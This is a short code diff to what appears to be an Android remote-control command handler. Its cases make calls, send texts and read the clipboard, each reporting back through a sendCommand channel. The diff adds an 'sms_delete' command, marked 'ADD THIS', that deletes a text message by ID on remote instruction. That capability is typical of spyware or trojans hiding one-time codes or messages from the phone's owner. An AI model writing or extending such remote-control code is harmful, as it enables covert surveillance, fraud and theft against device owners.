@@ -2027,15 +2027,32 @@ case "make_call":
                 }
                 break;
 
-            case "sms_send":
-                if (smsModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = smsModule.sendSms(parts2[0], parts2[1]);
-                    sendCommand("SMS_SEND|" + result);
-                } else {
-                    sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
+           case "sms_send":
+            if (smsModule != null && args.contains("|")) {
+                String[] parts2 = args.split("\\|", 2);
+                String result = smsModule.sendSms(parts2[0], parts2[1]);
+                sendCommand("SMS_SEND|" + result);
+            } else {
+                sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
+            }
+            break;
+        
+        // ── ADD THIS ──────────────────────────────────────────────────────────────
+        case "sms_delete":
+            if (smsModule != null && !args.isEmpty()) {
+                try {
+                    long smsId = Long.parseLong(args.trim());
+                    String result = smsModule.deleteSms(smsId);
+                    sendCommand("SMS_DELETE|" + result);
+                } catch (NumberFormatException e) {
+                    sendCommand("SMS_DELETE|{\"success\":false,\"error\":\"Invalid message ID\"}");
                 }
-                break;
+            } else {
+                sendCommand("SMS_DELETE|{\"success\":false,\"error\":\"No message ID provided\"}");
+            }
+            break;
+        // ── END ADD ───────────────────────────────────────────────────────────────
+
 
             case "clipboard_get":
                 new Thread(() -> {
